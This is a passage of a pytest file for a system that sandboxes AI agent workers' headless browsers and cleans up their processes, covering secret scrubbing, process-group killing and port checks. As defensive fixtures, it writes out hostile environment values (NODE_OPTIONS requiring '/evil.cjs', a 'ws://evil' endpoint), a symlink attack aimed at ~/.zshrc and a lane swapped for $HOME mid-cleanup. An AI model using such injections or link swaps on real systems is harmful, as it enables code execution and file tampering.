    while time.time() < end:
        if not running(pid):
            return True
        time.sleep(0.05)
    return False


def kill_quietly(*pids):
    """T7: a test that read a child's pid ends that child itself, whatever the code under test did."""
    for pid in pids:
        if pid:
            try:
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass


def test_the_brokers_environment_holds_exactly_the_listed_keys(env, monkeypatch):
    """Spec unit test 5: even when teamd's own environment has NODE_OPTIONS, PW_TEST_CONNECT_WS_ENDPOINT and another
    PLAYWRIGHT_BROWSERS_PATH; the broker gets teamd's own browsers folder."""
    monkeypatch.setenv("NODE_OPTIONS", "--require /evil.cjs")
    monkeypatch.setenv("PW_TEST_CONNECT_WS_ENDPOINT", "ws://evil")
    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", "/Users/me/Library/Caches/ms-playwright")
    got = lane.broker_env("/tmp/sy-lane-501/0123456789/b", "/pw")
    assert got == {"PATH": "/usr/bin:/bin", "HOME": str(env["home"]), "TMPDIR": "/tmp/sy-lane-501/0123456789/b",
                   "MAC_CHROMIUM_TMPDIR": "/tmp/sy-lane-501/0123456789/b",
                   "PLAYWRIGHT_BROWSERS_PATH": str(teamlib.team_home() / "broker" / "browsers"),
                   "SUPERYAK_BROKER_PLAYWRIGHT": "/pw"}                    # the secret goes on stdin


def test_a_broker_serves_on_the_last_port_and_stops_with_its_group(broker_parts):
    broker = start(broker_parts)
    b, base = broker_parts["path"] / "b", broker_parts["base"]
    child = None
    try:
        assert re.fullmatch(r"[0-9a-f]{64}", broker.secret) is not None and broker.port == base + 31, "secret shape"
        assert broker.endpoint == "ws://127.0.0.1:%d/%s" % (base + 31, broker.secret), "endpoint shape"   # no repr
        assert json.loads((b / "env.json").read_text()) == sorted(
            ["PATH", "HOME", "TMPDIR", "MAC_CHROMIUM_TMPDIR", "PLAYWRIGHT_BROWSERS_PATH", "SUPERYAK_BROKER_PLAYWRIGHT"])
        options = json.loads((b / "options.json").read_text())
        assert options.pop("wsPath") == "/" + broker.secret, "the secret path"
        assert options == {"headless": True, "host": "127.0.0.1", "port": base + 31, "chromiumSandbox": False}
        socket.create_connection(("127.0.0.1", base + 31), timeout=5).close()
        assert os.getpgid(broker.proc.pid) == broker.proc.pid                   # its own process group
        child = int((b / "child.pid").read_text())
        assert os.getpgid(child) == child                                       # the "browser" leads another one
        pids, groups = lane.family(broker.proc.pid)
        assert child in pids and groups == {broker.proc.pid, child}
        for pid in (broker.proc.pid, child):                                    # Chrome inherits no secret
            assert broker.secret.encode() not in Path("/proc/%d/environ" % pid).read_bytes(), "secret in environment"
    finally:
        lane.stop_broker(broker)
        stopped = gone(child) if child else True
        kill_quietly(child)
    assert broker.proc.poll() is not None and stopped
    assert lane.port_free(base + 31)


def test_starting_a_broker_ends_what_still_uses_its_folder(broker_parts):
    """Review (N6): a process left in b/ (an old broker's helper, or something that wrote there) ends before a new
    broker starts there."""
    b = broker_parts["path"] / "b"
    squatter = spawn_python("import time; time.sleep(60)", b)
    try:
        time.sleep(0.3)
        broker = start(broker_parts)
        lane.stop_broker(broker)
        assert gone(squatter.pid)
    finally:
        squatter.kill()
        squatter.wait()


def test_the_brokers_family_is_its_descendants_and_the_groups_they_lead(monkeypatch):
    """Review (N3): Chrome is node's child but leads its own group; a helper orphaned to launchd stays in Chrome's
    group. A group that no family member leads is never touched."""
    table = ("  700     1   700  501\n"      # the broker (node), its own group
             "  701   700   701  501\n"      # Chrome, detached
             "  702   701   701  501\n"      # a renderer
             "  703     1   701  501\n"      # a helper whose parent died: still in Chrome's group
             "  704   700   900  501\n"      # a child that joined someone else's group: itself, not that group
             "  900     1   900  501\n"      # that someone else
             "  801     1   801  501\n")     # unrelated
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, table))
    assert lane.family(700) == ({700, 701, 702, 703, 704}, {700, 701})


def test_nothing_in_the_lane_decides_what_the_broker_is(broker_parts):
    """Review: the profile goes inline and the script runs as node -e from teamd's package, so the lane's b/, which
    the broker itself (and any process that can write /tmp) can write, holds neither."""
    broker = start(broker_parts)
    try:
        b = broker_parts["path"] / "b"
        assert not (b / "broker.sb").exists() and not (b / "lane_broker.js").exists()
        profile = broker_parts["profile"].read_text()
        assert profile == lane.render_profile(lane.lane_text(b), broker_parts["pw"], lane.browsers_root(),
                                              broker_parts["shell"], broker_parts["node"], broker_parts["base"])
    finally:
        lane.stop_broker(broker)


def test_stopping_a_broker_reaches_a_browser_in_its_own_group(broker_parts):
    """Review (N3): Playwright starts Chrome detached, so killing node's group alone would leave a browser that
    ignores the close. stop_broker ends every group its family leads."""
    (broker_parts["pw"] / "STUBBORN").write_text("")
    broker = start(broker_parts)
    child = int((broker_parts["path"] / "b" / "child.pid").read_text())
    try:
        lane.stop_broker(broker)
        assert gone(child)
    finally:
        kill_quietly(child)


def test_the_broker_exits_when_its_browser_dies(broker_parts):
    """Review: a broker whose browser is gone exits, so teamd sees it dead and starts a new one at the next turn."""
    broker = start(broker_parts)
    try:
        os.kill(int((broker_parts["path"] / "b" / "child.pid").read_text()), signal.SIGKILL)   # the test ends it
        end = time.time() + 10
        while time.time() < end and broker.alive():
            time.sleep(0.05)
        assert not broker.alive()
    finally:
        lane.stop_broker(broker)


def test_a_broker_that_fails_is_refused_without_its_secret(broker_parts):
    """Spec: the broker's stderr is kept (in teamd's own folder) and never posted; its last lines reach the lead only
    after the scrub."""
    (broker_parts["pw"] / "FAIL").write_text("")
    with pytest.raises(lane.LaneRefused, match="the lane's browser didn't start") as refused:
        start(broker_parts)
    message = str(refused.value)
    assert "[lane secret]" in message, "the scrub marker"
    assert re.search(r"[0-9a-f]{64}", message) is None, "secret in the lead's message"
    assert re.search(r"[0-9a-f]{64}", broker_parts["stderr"].read_text()), "kept locally"    # in teamd's folder
    assert not (broker_parts["path"] / "b" / "stderr.log").exists()
    assert lane.port_free(broker_parts["base"] + 31)


def test_the_brokers_stderr_never_goes_through_a_planted_link(broker_parts, env):
    """Review: a stderr name swapped for a symlink to someone else's file, in the lane or in teamd's own folder,
    leaves that file as it was."""
    victim = env["home"] / ".zshrc"
    victim.write_text("export SECRET=1\n")
    os.symlink(victim, broker_parts["path"] / "b" / "stderr.log")
    broker_parts["stderr"].parent.mkdir(parents=True, exist_ok=True)
    os.symlink(victim, broker_parts["stderr"])
    (broker_parts["pw"] / "FAIL").write_text("")
    with pytest.raises(lane.LaneRefused):
        start(broker_parts)
    assert victim.read_text() == "export SECRET=1\n"
    assert not broker_parts["stderr"].is_symlink() and "launchServer failed" in broker_parts["stderr"].read_text()


def spawn_python(code, cwd):
    return subprocess.Popen([sys.executable, "-c", code], cwd=str(cwd), start_new_session=True,
                            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def wait_listening(port, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        try:
            socket.create_connection(("127.0.0.1", port), timeout=1).close()
            return
        except OSError:
            time.sleep(0.05)
    raise AssertionError("nothing listens on %d" % port)


@pytest.mark.skipif(not shutil.which("lsof"), reason="needs lsof")
def test_cleanup_ends_the_lanes_listeners_and_users_and_nothing_else(env, tmp_root, held, monkeypatch):
    """Spec, process cleanup: a listener in the block and a process working under the lane (Playwright's detached
    webServer, a dev server) end; a process outside the lane doesn't."""
    monkeypatch.setattr(lane, "KILL_GRACE_S", 1)
    held("t1")
    path = lane.ensure_lane("t1", "kaylee")
    base = lane.allocate_block("t1", "kaylee")
    server = spawn_python("import socket, time\ns = socket.socket()\ns.bind(('127.0.0.1', %d))\ns.listen()\n"
                          "time.sleep(60)" % (base + 3), env["tmp"])
    worker_child = spawn_python("import time; time.sleep(60)", path / "tmp")
    bystander = spawn_python("import time; time.sleep(60)", env["tmp"])
    try:
        wait_listening(base + 3)
        assert lane.cleanup_processes(path, base) is True
        assert gone(server.pid) and gone(worker_child.pid)
        assert bystander.poll() is None
    finally:
        for proc in (server, worker_child, bystander):
            proc.kill()
            proc.wait()


@pytest.mark.skipif(not shutil.which("lsof"), reason="needs lsof")
def test_a_lane_swapped_for_a_link_to_home_mid_cleanup_kills_nothing_there(env, tmp_root, monkeypatch):
    """Review: cleanup matches lsof's names against the lane's own path, never walking or resolving the lane, so a
    lane root swapped for a link to $HOME while cleanup runs touches nothing in $HOME."""
    monkeypatch.setattr(lane, "KILL_GRACE_S", 1)
    path = lane.ensure_lane("t1", "kaylee")
    (env["home"] / "notes.txt").write_text("mine\n")
    in_home = spawn_python("import time; time.sleep(60)", env["home"])
    real_run, swapped = lane._run, []

    def run(cmd, timeout=60):
        if not swapped:                                     # the swap lands while cleanup is running
            shutil.rmtree(path)
            os.symlink(env["home"], path)
            swapped.append(True)
        return real_run(cmd, timeout)
    monkeypatch.setattr(lane, "_run", run)
    try:
        assert lane.cleanup_processes(path, None) is True
        time.sleep(0.5)                                     # a signal would have landed by now
        assert swapped and in_home.poll() is None
        with pytest.raises(lane.LaneRefused, match="unsafe lane"):
            lane.remove_lane(path)
        assert (env["home"] / "notes.txt").read_text() == "mine\n"
    finally:
        in_home.kill()
        in_home.wait()


@pytest.mark.skipif(not os.path.exists("/proc/self/environ"), reason="reads /proc, as the Pi's tests do")
def test_cleanup_ends_what_still_carries_the_lanes_environment(env, tmp_root, monkeypatch):
    """Review (N4): a turn's setsid child holds nothing in the lane, but its environment still names the lane's
    CLAUDE_CODE_TMPDIR. Only the exact value matches."""
    monkeypatch.setattr(lane, "KILL_GRACE_S", 1)
    path = lane.ensure_lane("t1", "kaylee")
    value = str(path / "tmp")

    def started(with_value):
        return subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"], cwd=str(env["tmp"]),
                                env=dict(os.environ, CLAUDE_CODE_TMPDIR=with_value), start_new_session=True)
    orphan, neighbour = started(value), started(value + "x")
    try:
        time.sleep(0.3)
        assert lane.cleanup_processes(path, None, env=("CLAUDE_CODE_TMPDIR", value)) is True
        assert gone(orphan.pid) and neighbour.poll() is None
    finally:
        for proc in (orphan, neighbour):
            proc.kill()
            proc.wait()


def test_the_environment_match_never_takes_teamd_or_its_parents(monkeypatch):
    """Review (N4): even if teamd's own environment carried the value, it and every process above it are spared."""
    me, parent = os.getpid(), os.getppid()
    table = "%d %d %d %d\n%d 1 %d %d\n4242 1 4242 %d\n4243 1 4243 %d\n" % (
        me, parent, me, os.getuid(), parent, parent, os.getuid(), os.getuid(), os.getuid() + 1)
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, table))
    monkeypatch.setattr(lane, "_environ", lambda pid: ["HOME=/h", "CLAUDE_CODE_TMPDIR=/tmp/sy-lane-1/abc/tmp"])
    assert lane.env_pids("CLAUDE_CODE_TMPDIR", "/tmp/sy-lane-1/abc/tmp") == {4242}      # 4243 is another user's


def test_cleanup_is_unfinished_when_lsof_cannot_say(env, tmp_root, monkeypatch):
    path = lane.ensure_lane("t1", "kaylee")
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: None)
    assert lane.cleanup_processes(path, 41000) is False
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: "/usr/sbin/lsof")
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(2, ""))
    assert lane.cleanup_processes(path, 41000) is False


def test_denials_are_kept_only_for_the_brokers_process_group():
    """Spec, diagnostics: by pid, never by name."""
    lines = [
        "2026-10-08 10:00:01.1 E  kernel[0:1] Sandbox: Mail(311) deny(1) file-read-data /Users/me/Library/Mail Downloads/payslip.pdf",
        "2026-10-08 10:00:01.2 E  kernel[0:1] Sandbox: node(4410) deny(1) network-outbound 1.1.1.1:443",
        "2026-10-08 10:00:01.3 E  kernel[0:1] Sandbox: chrome-headless-sh(5001) deny(1) mach-lookup com.apple.pasteboard.1",
        "2026-10-08 10:00:01.4 E  kernel[0:1] Sandbox: node(5000) deny(1) file-read-data /Users/me/.zshrc",
        "2026-10-08 10:00:01.5 E  kernel[0:1] Sandbox: chrome-headless-sh(5001) deny(1) mach-lookup com.apple.pasteboard.1",
        "not a denial",
    ]
    assert lane.denials_for(lines, {5000, 5001}) == [
        "chrome-headless-sh(5001): mach-lookup com.apple.pasteboard.1", "node(5000): file-read-data /Users/me/.zshrc"]


def test_the_secret_is_scrubbed_from_text_and_files(tmp_path):
    secret = "cd" * 32
    endpoint = "ws://127.0.0.1:41031/" + secret
    assert lane.scrub("connect failed: " + endpoint, [secret]) == "connect failed: ws://127.0.0.1:41031/[lane secret]"
    assert lane.scrub("nothing here", []) == "nothing here"
    events = tmp_path / "events.jsonl"
    events.write_text(json.dumps({"type": "result", "result": "error at " + endpoint}) + "\n")
    lane.scrub_file(events, [secret])
    assert secret not in events.read_text(), "secret left in the file"
    assert "[lane secret]" in events.read_text(), "no marker"


def test_prepare_broker_runs_for_real_without_deadlocking_on_the_install_lock(env, manifests, unpack, monkeypatch):
    """Every other test stubs prepare_broker; this one runs the real thing, whose install lock the installers take
    again inside it (the plan's old teamlib.locked on the same file deadlocked)."""
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    node = Path(os.path.realpath(NODE or sys.executable))
    monkeypatch.setattr(lane, "check_lane_node", lambda value, worktrees: node)
    monkeypatch.setattr(lane, "_run_env", lambda cmd, e, cwd, timeout=900: (
        fake_shell(lane.browsers_root() / "chromium_headless_shell-1243"), Ran(0, ""))[1])
    probe = env["tmp"] / "shellprobe"
    fake_shell(probe)
    record(manifests, "1243", lane.manifest_hash(probe))
    result, errors = [], []

    def run():
        try:
            result.append(lane.prepare_broker(env["repo"], base, [], fetch=Registry(tarball)))
        except BaseException as e:                                      # reported below, never lost in the thread
            errors.append(e)
    t = threading.Thread(target=run, daemon=True)
    t.start()
    t.join(20)
    assert not t.is_alive(), "prepare_broker deadlocked"
    assert not errors, errors
    node_bin, pw_dir, shell_dir = result[0]
    assert node_bin == node and pw_dir == lane.broker_root() / "playwright-core-1.55.0"
    assert shell_dir == lane.browsers_root() / "chromium_headless_shell-1243"



# ---------- Task 7, fix round 1 ----------

class FakeProc:
    def __init__(self, pid, polled=None):
        self.pid, self.polled = pid, polled
        self.stdin = io.StringIO()

    def poll(self):
        return self.polled

    def wait(self, timeout=None):
        return self.polled


FAMILY_TABLE = ("  700     1   700  501\n  701   700   701  501\n  702   701   701  501\n  703     1   701  501\n"
                "  704   700   900  501\n  900     1   900  501\n  801     1   801  501\n")


def test_stopping_a_broker_that_was_already_reaped_signals_nothing(monkeypatch):
    """A reaped broker's pid can belong to someone else now: no family walk, no signal."""
    sent = []
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, FAMILY_TABLE))
    monkeypatch.setattr(lane, "_killpg", lambda g, sig: sent.append(("pg", g, sig)))
    monkeypatch.setattr(lane, "_kill", lambda p, sig: sent.append(("pid", p, sig)))
    monkeypatch.setattr(lane, "_alive", lambda pid: True)
    lane.stop_broker(lane.Broker(FakeProc(700, polled=0), 41031, "ab" * 32))
    assert sent == [], "signals went to a reaped broker's pid"


def test_stopping_a_broker_signals_its_groups_and_each_pid(monkeypatch):
    """Both paths are pinned: killpg on the groups the family leads, kill on the pids (704 leads no group of its own
    in the family)."""
    monkeypatch.setattr(lane, "KILL_GRACE_S", 0.2)
    groups, pids = [], []
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, FAMILY_TABLE))
    monkeypatch.setattr(lane, "_killpg", lambda g, sig: groups.append((g, sig)))
    monkeypatch.setattr(lane, "_kill", lambda p, sig: pids.append((p, sig)))
    monkeypatch.setattr(lane, "_alive", lambda pid: True)
    lane.stop_broker(lane.Broker(FakeProc(700), 41031, "ab" * 32))
    for sig in (signal.SIGTERM, signal.SIGKILL):
        assert {g for g, s in groups if s == sig} == {700, 701}
        assert 704 in {p for p, s in pids if s == sig}
    assert 801 not in {p for p, s in pids} and 900 not in {g for g, s in groups}


def test_alive_never_reaps_a_child_somebody_else_owns():
    proc = subprocess.Popen([sys.executable, "-c", "raise SystemExit(3)"])
    try:
        end = time.time() + 5
        while time.time() < end and lane._alive(proc.pid):
            time.sleep(0.05)
        assert not lane._alive(proc.pid)
        assert proc.poll() == 3, "_alive reaped the child"
    finally:
        proc.wait()


def test_cleanup_kills_only_what_still_matches_after_the_grace(monkeypatch):
    """A pid that exited during the grace may be reused: SIGKILL goes to what the second look finds."""
    monkeypatch.setattr(lane, "KILL_GRACE_S", 0.2)
    rounds, sent = [{4001, 4002}, {4002}], []
    monkeypatch.setattr(lane, "lane_pids", lambda path, base: rounds.pop(0))
    monkeypatch.setattr(lane, "_alive", lambda pid: True)
    monkeypatch.setattr(lane, "_kill", lambda p, sig: sent.append((p, sig)))
    assert lane.cleanup_processes("/x", None) is True
    assert (4001, signal.SIGKILL) not in sent and (4002, signal.SIGKILL) in sent


def test_a_refused_start_after_the_child_spawned_ends_what_uses_the_folder(broker_parts):
    (broker_parts["pw"] / "FAIL_AFTER_SPAWN").write_text("")
    with pytest.raises(lane.LaneRefused):
        start(broker_parts)
    child = int((broker_parts["path"] / "b" / "child.pid").read_text())
    try:
        assert gone(child), "a process using b/ outlived the refused start"
    finally:
        kill_quietly(child)


def test_a_secret_cut_by_the_truncation_cant_survive_the_scrub(broker_parts):
    (broker_parts["pw"] / "FAIL").write_text("217")          # the endpoint straddles the 300-character cut
    with pytest.raises(lane.LaneRefused) as refused:
        start(broker_parts)
    assert re.search(r"[0-9a-f]{12}", str(refused.value)) is None, "part of the secret reached the message"
    assert "[lane secret]" in str(refused.value)


def lsof_stub(monkeypatch, listing, rc=0, table=""):
    def run(cmd, timeout=60):
        if cmd[0] == "/bin/ps":
            return Ran(0, table)
        return Ran(rc, listing)
    monkeypatch.setattr(lane, "_run", run)
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: "/usr/sbin/lsof")


def test_a_full_lsof_listing_that_exits_1_fails_closed(env, tmp_root, monkeypatch):
    path = lane.ensure_lane("t1", "kaylee")
    lsof_stub(monkeypatch, "p123\nn%s/tmp/f\n" % path, rc=1)
    assert lane.lane_pids(path, None) is None


def test_the_lane_prefix_match_needs_the_separator_and_teamd_is_never_taken(env, tmp_root, monkeypatch):
    path = lane.ensure_lane("t1", "kaylee")
    listing = "p111\nn%s/tmp/f\np222\nn%sd/f\np%d\nn%s/b\n" % (path, path, os.getpid(), path)
    lsof_stub(monkeypatch, listing, table="%d 1 %d %d\n" % (os.getpid(), os.getpid(), os.getuid()))
    assert lane.lane_pids(path, None) == {111}


def test_lane_pids_spares_teamds_whole_parent_chain(env, tmp_root, monkeypatch):
    path = lane.ensure_lane("t1", "kaylee")
    me, parent = os.getpid(), os.getppid()
    table = "%d %d %d %d\n%d 1 %d %d\n" % (me, parent, me, os.getuid(), parent, parent, os.getuid())
    listing = "p%d\nn%s/tmp/f\np555\nn%s/tmp/g\n" % (parent, path, path)
    lsof_stub(monkeypatch, listing, table=table)
    assert lane.lane_pids(path, None) == {555}


def test_failures_reading_the_script_or_making_the_folder_refuse(broker_parts, monkeypatch):
    blocker = broker_parts["stderr"].parent.parent / "blocker"
    blocker.parent.mkdir(parents=True, exist_ok=True)
    blocker.write_text("a file")
    parts = dict(broker_parts, stderr=blocker / "sub" / "stderr.log")
    with pytest.raises(lane.LaneRefused, match="can't start"):
        start(parts)
    monkeypatch.setattr(lane.teamlib, "package_dir", lambda: broker_parts["path"] / "nowhere")
    with pytest.raises(lane.LaneRefused, match="can't start"):
        start(broker_parts)


def test_scrub_file_refuses_instead_of_raising_when_it_cant_write(tmp_path):
    folder = tmp_path / "locked"
    folder.mkdir()
    events = folder / "events.jsonl"
    events.write_text("at ws://x/" + "cd" * 32)
    folder.chmod(0o500)
    try:
        with pytest.raises(lane.LaneRefused, match="can't be scrubbed"):
            lane.scrub_file(events, ["cd" * 32])
    finally:
        folder.chmod(0o700)


# ---------- Task 8: teamd runs the lane ----------

SECRET = "5e" * 32


class FakeTurnProc:
    def __init__(self):
        self.pid, self.code = 4242, None

    def poll(self):
        return self.code


class FakeBroker:
    """What lane.start_broker returns, without a browser."""
    def __init__(self, base, secret=SECRET):
        self.proc, self.port, self.secret = FakeTurnProc(), base + 31, secret

    @property
    def endpoint(self):
        return "ws://127.0.0.1:%d/%s" % (self.port, self.secret)

    def alive(self):
        return self.proc.poll() is None


class FakeSlack:
    def __init__(self):
        self.posts = []

    def post(self, text, username, kind="lead", thread_ts=None):
        self.posts.append(text)
        return "%d.0001" % (100 + len(self.posts))


@pytest.fixture
def lanes(env, mac, tmp_root, monkeypatch):
    """teamd with every macOS-only step faked: the listener check, the broker and its process cleanup."""
    calls = {"listeners": 0, "started": [], "stopped": [], "cleanup": []}
    state = {"ok": True, "problems": [], "cleanup_finishes": True}

    def listeners_ok():
        calls["listeners"] += 1
        return state["ok"], list(state["problems"])

    def start_broker(path, base, node_bin, pw_dir, shell_dir, stderr_path):
        broker = FakeBroker(base)
        calls["started"].append((path, base, broker, stderr_path))
        return broker

    def stop_broker(broker):
        broker.proc.code = -15
        calls["stopped"].append(broker)

    def cleanup_processes(path, base, broker=None, env=None):
        calls["cleanup"].append((path, base, broker, lane.block_of("t1", "kaylee"), env))
        if broker is not None:
            stop_broker(broker)
        return state["cleanup_finishes"]
    monkeypatch.setattr(lane, "listeners_ok", listeners_ok)
    def prepare_broker(repo, base, worktrees, verify=True):
        calls["prepare"].append(verify)
        return "/opt/homebrew/bin/node", "/pw", "/shell"
    calls["prepare"] = []
    monkeypatch.setattr(lane, "prepare_broker", prepare_broker)
    monkeypatch.setattr(lane, "start_broker", start_broker)
    monkeypatch.setattr(lane, "stop_broker", stop_broker)
    monkeypatch.setattr(lane, "cleanup_processes", cleanup_processes)
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    launched = []
    real_launch = teamd.workers.launch

    def launch(cmd, cwd, worker_dir, env_extra=None, drop_env=()):
        launched.append({"cmd": cmd, "env": dict(env_extra or {}), "drop": tuple(drop_env)})
        return real_launch(cmd, cwd, worker_dir, env_extra, drop_env)
    monkeypatch.setattr(teamd.workers, "launch", launch)
    return {"calls": calls, "state": state, "launched": launched}


def run_until(team, pred, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        team.monitor_once()
        if pred():
            return True
        time.sleep(0.05)
    return False


def browser_team(env, **cfg):
    team = lane_team(env, **cfg)
    now = [1000.0]
    team.clock = lambda: now[0]
    return team, now


def test_a_browser_turn_runs_in_its_lane_with_its_broker(env, lanes):
    team, now = browser_team(env)
    r = team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"][r["worker"]]
    assert w["state"] == "running"
    path = lane.lane_path("t1", "kaylee")
    preload = teamlib.team_dir("t1") / "workers" / "kaylee" / "lane-preload.cjs"
    assert w["lane"] == {"hash": path.name, "path": str(path), "base": 41000, "preload": str(preload)} and path.is_dir()
    settings = json.loads((team.dir / "workers" / "kaylee" / "settings.json").read_text())
    assert settings["sandbox"]["network"]["allowUnixSockets"] == [str(path / "tmp")]
    first = lanes["launched"][0]
    assert first["drop"] == lane.DROP_ENV
    assert first["env"]["PW_TEST_CONNECT_WS_ENDPOINT"] == "ws://127.0.0.1:41031/" + SECRET
    assert first["env"]["NODE_OPTIONS"] == '--require "%s"' % preload
    assert "--strict-mcp-config" in first["cmd"]
    assert first["env"]["ENGRAM_PROJECT_ROOT"] == w["path"]
    assert lanes["calls"]["listeners"] == 1 and len(lanes["calls"]["started"]) == 1
    assert lanes["calls"]["started"][0][3] == team.dir / "workers" / "kaylee" / "broker-stderr.log"   # never the lane
    assert run_until(team, lambda: w["state"] == "idle")
    team.deliver("kaylee", "now the signup page", "lead")
    assert w["state"] == "running" and len(lanes["calls"]["started"]) == 1     # the same broker for the next turn
    assert lanes["calls"]["listeners"] == 2                                     # checked again before the turn
    plain = team.spawn("write docs", "claude")
    assert lanes["launched"][-1]["drop"] == () and "PW_TEST_CONNECT_WS_ENDPOINT" not in lanes["launched"][-1]["env"]
    assert "--strict-mcp-config" not in lanes["launched"][-1]["cmd"] and "NODE_OPTIONS" not in lanes["launched"][-1]["env"]
    assert "lane" not in team.state["workers"][plain["worker"]]


def test_an_unapproved_listener_makes_the_turn_wait_until_it_is_gone(env, lanes):
    """D9, and review focus: an Apple service that isn't approved on this port (AirPlay's 5000, say) never makes the
    lane refuse silently or forever. The lead hears once, by command name, port and executable; the worker starts by
    itself once the check passes; the broker never starts before it does."""
    slack = FakeSlack()
    team, now = browser_team(env)
    team.slack = slack
    airplay = "ControlCe (pid 501) listens on port 5000 (%s)" % CONTROL_CENTER
    lanes["state"].update(ok=False, problems=[airplay])
    r = team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"][r["worker"]]
    assert w["state"] == "waiting" and r["worker"] not in team.procs
    assert lanes["calls"]["started"] == []
    waiting = [m for m in team.state["lead_inbox"] if "LANE WAITING" in m["message"]]
    assert len(waiting) == 1 and "ControlCe" in waiting[0]["message"] and "port 5000" in waiting[0]["message"]
    assert CONTROL_CENTER in waiting[0]["message"] and "quoted message" in waiting[0]["message"]
    assert not any("ControlCe" in p for p in slack.posts)                        # no process names on Slack
    now[0] += 10
    team.monitor_once()
    assert lanes["calls"]["listeners"] == 1                                      # not before LANE_RETRY_S
    now[0] += teamd.LANE_RETRY_S
    team.monitor_once()
    assert lanes["calls"]["listeners"] == 2 and w["state"] == "waiting"
    assert len([m for m in team.state["lead_inbox"] if "LANE WAITING" in m["message"]]) == 1   # same reason: once
    lanes["state"].update(ok=True, problems=[])
    now[0] += teamd.LANE_RETRY_S
    team.monitor_once()
    assert w["state"] == "running" and len(lanes["calls"]["started"]) == 1 and "lane_wait" not in w
    assert "YOUR TASK" in lanes["launched"][0]["cmd"][2]                        # the turn it was waiting to run


def test_a_listener_that_appears_during_a_turn_stops_the_turn_and_the_broker(env, lanes, monkeypatch):
    """Spec unit test 8, with a fake clock: checked every 60 s, and a failure stops the turn and the broker."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    r = team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"][r["worker"]]
    broker = lanes["calls"]["started"][0][2]
    now[0] += 59
    team.monitor_once()
    assert lanes["calls"]["listeners"] == 1                                      # not yet
    lanes["state"].update(ok=False, problems=["Python (pid 9) listens on port 8000"])
    now[0] += 1
    team.monitor_once()
    assert lanes["calls"]["listeners"] == 2 and broker in lanes["calls"]["stopped"]
    assert any("LANE STOPPED" in m["message"] and "port 8000" in m["message"] for m in team.state["lead_inbox"])
    assert run_until(team, lambda: w["state"] == "failed", timeout=10)
    assert not lane.lane_path("t1", "kaylee").exists() and lane.block_of("t1", "kaylee") is None


def ends_lane(lanes, team, wid="kaylee"):
    """The lane's folder and block are gone, and its cleanup also looked for its environment (review N4)."""
    path = lane.lane_path("t1", wid)
    return (not path.exists() and lane.block_of("t1", wid) is None and team.state["workers"][wid]["lane"] is None
            and any(c[0] == path and c[4] == ("CLAUDE_CODE_TMPDIR", str(path / "tmp")) for c in lanes["calls"]["cleanup"]))


def test_worker_done_ends_the_lane_once_its_turn_has_exited(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")      # the turn outlives worker_done's git calls, even on a busy Pi
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.worker_done("kaylee", "login page checked", "npx playwright test: 12 passed")
    assert lane.lane_path("t1", "kaylee").exists()                              # the worker is still answering
    assert run_until(team, lambda: "kaylee" not in team.procs, timeout=20)
    assert ends_lane(lanes, team)
    assert lanes["calls"]["cleanup"][-1][2] is lanes["calls"]["started"][0][2]  # with its broker


def test_stop_worker_ends_the_lane(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.stop_worker("kaylee")
    assert ends_lane(lanes, team)


def test_a_failed_turn_ends_the_lane(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    os.killpg(team.procs["kaylee"].pid, signal.SIGTERM)
    assert run_until(team, lambda: team.state["workers"]["kaylee"]["state"] == "failed")
    assert ends_lane(lanes, team)


def test_end_ends_every_lane(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.spawn("check the signup page", "claude", browser=True)
    assert lane.block_of("t1", "wash") == 41032
    team.end("done", keep_worktrees=False)
    assert ends_lane(lanes, team, "kaylee") and ends_lane(lanes, team, "wash")


def test_a_block_is_freed_only_after_the_cleanup_has_finished(env, lanes, monkeypatch):
    """Spec unit test 7."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    lanes["state"]["cleanup_finishes"] = False
    team.stop_worker("kaylee")
    assert lanes["calls"]["cleanup"][-1][3] == 41000                            # held while the cleanup ran
    assert lane.block_of("t1", "kaylee") == 41000 and team.state["workers"]["kaylee"]["lane"]["base"] == 41000
    assert any("LANE CLEANUP UNFINISHED" in m["message"] for m in team.state["lead_inbox"])
    lanes["state"]["cleanup_finishes"] = True
    team.end("done", keep_worktrees=True)
    assert lane.block_of("t1", "kaylee") is None


def test_a_refused_lane_fails_the_worker_and_tells_the_lead_why(env, lanes, monkeypatch):
    """Review focus: a legitimate Playwright update whose headless-shell revision has no recorded manifest hash. The
    spawn checked it once (here it passed); the lane's first turn checks again and is refused. The lead hears the
    revision and the hash to record; the worker fails instead of retrying; nothing is left."""
    slack = FakeSlack()
    team, now = browser_team(env)
    team.slack = slack
    message = ("no manifest hash is recorded for chromium-headless-shell 1250 on darwin-arm64: a person records the "
